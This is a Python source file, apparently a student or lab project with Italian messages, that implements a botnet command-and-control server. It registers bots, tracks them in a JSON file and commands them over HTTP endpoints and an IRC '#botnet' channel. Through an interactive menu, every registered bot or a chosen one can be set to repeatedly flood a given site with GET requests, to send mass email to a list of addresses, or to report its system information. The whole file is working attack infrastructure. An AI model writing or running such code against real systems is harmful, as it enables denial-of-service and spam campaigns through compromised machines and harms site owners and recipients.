import concurrent.futures
import socket
import json
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor
from ftplib import FTP
from time import sleep

import requests


def sendMessage(s, message):
    s.send(bytes(f"{message}\r\n", "UTF-8"))


def readMessage(s):
    buff = s.recv(2048).decode("UTF-8")
    message = buff.split("\r\n")
    for m in message:
        print(m)
        if m.startswith("PING"):
            sendMessage(s, "PONG :botnet.sicurezza.com")
        if m.startswith(":bot-"):
            if "PONG" in m:
                return True
            comando = m[m.index(":#botnet: ") + 10::]
            comando = comando.split("|")
            if comando[0] == "systemInfo":
                return comando[1]
            else:
                return comando


def irc():
    NICKNAME = "cc"
    CHANNEL = "#botnet"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 6697))
        s.settimeout(5)
        s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
        s.send(bytes(f"USER {NICKNAME} {NICKNAME} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
        sleep(2)
        sendMessage(s, f"JOIN {CHANNEL}:\r\n")
        sleep(2)
        readMessage(s)
        return s
    except Exception as e:
        print("IRC error:", e)
        return None


def closeIrc(s):
    if s is not None:
        sendMessage(s, "QUIT\r\n")
        s.close()


class CC:
    # lista dei bot attivi con le relative porte
    activeBotSM = True
    activeBot = {}

    # costruttore
    def __init__(self):
        self.loadData()
        self.checkBot()

    def addBot(self, ip, data):
        while (not self.activeBotSM):
            continue
        self.activeBotSM = False
        self.activeBot[ip] = json.loads(data)
        self.activeBotSM = True
        return True

    def listen(self, event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 49171))
            s.settimeout(2)
            print("Server is listening...")
            while True and (not event.is_set()):
                try:
                    s.listen()
                    res = True
                    conn, addr = s.accept()
                    data = conn.recv(1024).decode()
                    data = data.split(" ")
                    res = self.addBot(data[0], data[1])
                    if res:
                        data = "bot registrated succesfully"
                        conn.send(data.encode())
                    else:
                        data = "bot not registrated"
                        conn.send(data.encode())
                    conn.close()
                except Exception as e:
                    continue
        except Exception as e:
            print("\nListening errors:", e)
            return
        finally:
            conn.close()
            s.close()

    def checkBot(self):
        rm = []
        for k, v in self.activeBot.items():
            if 'http' in self.activeBot[k]:
                try:
                    url = "http://" + k + ":" + str(v['http']) + "/status"
                    response = requests.get(url, timeout=10)
                    res = response.json()
                    self.activeBot[k]['target'] = res['target']
                    self.activeBot[k]['action'] = res['action']
                except Exception as e:
                    print(k, "is not reachable over http port.")
                    del self.activeBot[k]['http']

            if 'irc' in self.activeBot[k]:
                try:
                    s = irc()
                    if s is None:
                        print("IRC connection error")
                        return
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: PING")
                    sleep(1)
                    m = readMessage(s)
                    closeIrc(s)
                    if not m:
                        print(k, "is not reachable over irc port.")
                        del self.activeBot[k]['irc']
                except Exception as e:
                    print(k, "is not reachable over irc port.")
                    del self.activeBot[k]['irc']
            if len(self.activeBot[k]) == 2:
                rm.append(k)
        for k in rm:
            del self.activeBot[k]

    def makeHTTPRequest(self, server, time=1, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
                    response = requests.post(url, json={"url": server, "time":time}, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
                response = requests.post(url, json={"url": server, "time": time}, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def stopHTTPAttack(self, target=""):
        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/stopAttack"
                    response = requests.get(url, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/stopAttack"
                response = requests.get(url, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def getHTTPSystemInfo(self, target=""):
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/getSystemInfo"
                    response = requests.get(url)
                    res = response.json()
                    print("\t-----System info about", k, "-----")
                    for j,z in res.items():
                        if len(j) <= 6:
                            print("\t" + j + ":\t\t\t", z)
                        else:
                            print("\t" + j + ":\t\t", z)
                except Exception as e:
                    print(e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/getSystemInfo"
                response = requests.get(url)
                res = response.json()
                print("\t-----System info about", target, "-----")
                for j, z in res.items():
                    if len(j) <= 6:
                        print("\t" + j + ":\t\t\t", z)
                    else:
                        print("\t" + j + ":\t\t", z)
            except Exception as e:
                print(e)

    def sendHTTPEmail(self, target=""):
        users = None
        oggetto = None
        messaggio = None

        try:
            with open("email.json", 'r') as f:
                res = json.load(f)
                users = res["utenti"]
                oggetto = res["oggetto"]
                messaggio = res["messaggio"]
        except Exception as e:
            print("File error:",e)


        print("Invio richiesta...")
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    url = "http://" + k + ":" + str(v["http"]) + "/sendEmail"
                    response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                    res = response.json()
                    self.activeBot[k]["target"] = res["target"]
                    self.activeBot[k]["action"] = res["action"]
                except Exception as e:
                    print("Impossibile inviare la richiesta a", k, e)
        else:
            try:
                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/sendEmail"
                response = requests.post(url, json={"oggetto": oggetto, "messaggio": messaggio, "utenti": users}, timeout=10)
                res = response.json()
                self.activeBot[target]["target"] = res["target"]
                self.activeBot[target]["action"] = res["action"]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        print("Richiesta inviata")

    def makeIRCRequest(self, server, time=1, target=""):
        s = irc()
        if s is None:
            print("IRC connection error")
            return
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: get|{server}|{time}")
                    sleep(1)
                    res = readMessage(s)
                    self.activeBot[k]["target"] = res[1]
                    self.activeBot[k]["action"] = res[2]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: get|{server}|{time}")
                sleep(1)
                res = readMessage(s)
                self.activeBot[target]["target"] = res[1]
                self.activeBot[target]["action"] = res[2]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        closeIrc(s)

    def stopIRCAttack(self, target=""):
        s = irc()
        if s == None:
            print("IRC connection error")
            return
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: stop")
                    sleep(1)
                    res = readMessage(s)
                    self.activeBot[k]["target"] = res[1]
                    self.activeBot[k]["action"] = res[2]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: stop")
                sleep(1)
                res = readMessage(s)
                self.activeBot[target]["target"] = res[1]
                self.activeBot[target]["action"] = res[2]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        closeIrc(s)

    def getIRCSystemInfo(self, target=""):
        s = irc()
        if s is None:
            print("IRC connection error")
            return
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: systemInfo")
                    sleep(1)
                    res = readMessage(s)
                    res = json.loads(res)
                    print("\t-----System info about", k, "-----")
                    for j, z in res.items():
                        if len(j) <= 6:
                            print("\t" + j + ":\t\t\t", z)
                        else:
                            print("\t" + j + ":\t\t", z)
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: systemInfo")
                readMessage(s)
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        closeIrc(s)

    def sendIRCEmail(self, target=""):
        users = None
        oggetto = None
        messaggio = None

        s = irc()
        if s is None:
            print("IRC connection error")
            return

        try:
            with open("email.json", 'r') as f:
                res = json.load(f)
                users = res["utenti"]
                oggetto = res["oggetto"]
                messaggio = res["messaggio"]
        except Exception as e:
            print("File error:", e)
            return

        if target == "":
            for k, v in self.activeBot.items():
                try:
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: send|{oggetto}|{messaggio}|{users}")
                    sleep(1)
                    res = readMessage(s)
                    self.activeBot[k]["target"] = res[1]
                    self.activeBot[k]["action"] = res[2]
                except Exception as e:
                    print("Impossibile inviare la richiesta a",k, e)
        else:
            try:
                sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: send|{oggetto}|{messaggio}|{users}")
                sleep(1)
                res = readMessage(s)
                self.activeBot[target]["target"] = res[1]
                self.activeBot[target]["action"] = res[2]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        closeIrc(s)

    def getIRCStatus(self, target=""):
        s = irc()
        if s == None:
            print("IRC connection error")
            return
        if target == "":
            for k, v in self.activeBot.items():
                try:
                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: status")
                    sleep(1)
                    res = readMessage(s)
                    self.activeBot[k]["target"] = res[1]
                    self.activeBot[k]["action"] = res[2]
                except Exception as e:
                    print("Impossibile inviare la richiesta a", k, e)
        else:
            try:
                sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: status")
                sleep(1)
                res = readMessage(s)
                self.activeBot[target]["target"] = res[1]
                self.activeBot[target]["action"] = res[2]
            except Exception as e:
                print("Impossibile inviare la richiesta a", target, e)
        closeIrc(s)

    def command(self, event):
        sleep(1)
        while (True):
            print("\n---------------Command list:---------------\n"
                  "\t1) Show active bot\n"
                  "\t2) Show active bot a their status\n"
                  "\t3) Execute a get attack\n"
                  "\t4) Get info about bot\n"
                  "\t5) Email attack\n"
                  "\t6) Stop all attacks\n"
                  "\t7) Get bot statys\n"
                  "\t8) Check bot service\n"
                  "\t9) Stop CC\n")
            comando = input("C&C@command: ")
            match int(comando):
                case 1:
                    print("Ip\t\thttp\t\tirc")
                    if len(self.activeBot) > 0:
                        for k, v in self.activeBot.items():
                            print(f"{k}\t{v['http']}\t\t{v['irc']}")
                case 2:
                    print("Ip\t\thttp\t\tirc\t\ttarget\t\taction")
                    if len(self.activeBot) > 0:
                        for k, v in self.activeBot.items():
                            print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
                case 3:
                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
                    site = input("Enter site url: ")
                    time = input("Enter number of attack(-1=infinite): ")
                    target = input("Enter target(ip or all): ")
                    if target == "all":
                        self.makeHTTPRequest(site, time=int(time)) if service == "1" else self.makeIRCRequest(site, time=int(time))
                    else:
                        self.makeHTTPRequest(site, time=int(time), target=target) if service == "1" else self.makeIRCRequest(site, time=int(time), target=target)
                case 4:
                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
                    target = input("Enter target(ip or all): ")
                    if target == "all":
                        self.getHTTPSystemInfo() if service == "1" else self.getIRCSystemInfo()
                    else:
                        self.getHTTPSystemInfo(target=target) if service == "1" else self.getIRCSystemInfo(target=target)
                case 5:
                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
                    target = input("Enter target(ip or all): ")
                    if target == "all":
                        self.sendHTTPEmail() if service == "1" else self.sendIRCEmail()
                    else:
                        self.sendHTTPEmail(target=target) if service == "1" else self.sendIRCEmail(target=target)
                case 6:
                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
                    target = input("Enter target(ip or all): ")
                    if target == "all":
                        self.stopHTTPAttack() if service == "1" else self.stopIRCAttack()
                    else:
                        self.stopHTTPAttack(target=target) if service == "1" else self.stopIRCAttack(target=target)
                case 7:
                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
                    target = input("Enter target(ip or all): ")
                    if target == "all":
                        self.stopHTTPAttack() if service == "1" else self.stopIRCAttack()
                    else:
                        self.stopHTTPAttack(target=target) if service == "1" else self.stopIRCAttack(target=target)
                case 8:
                    self.checkBot()
                case 9:
                    event.set()
                    return

    def loadData(self):
        with open("./activeBot.json", 'r') as f:
            self.activeBot = json.load(f)

    def writeData(self):
        with open("./activeBot.json", 'w') as f:
            json.dump(self.activeBot, f, indent=2)


def startCC():
    print("Starting C&C...")
    cc = CC()
    event = Event()
    task = []
    with ThreadPoolExecutor(max_workers=2) as exec:
        task.append(exec.submit(cc.listen, event))
        task.append(exec.submit(cc.command, event))
        done, not_done = concurrent.futures.wait(task, return_when=concurrent.futures.FIRST_COMPLETED)
        exec.shutdown(wait=False)
    cc.writeData()
    print("C&C stopped")
    return


if __name__ == "__main__":
    startCC()
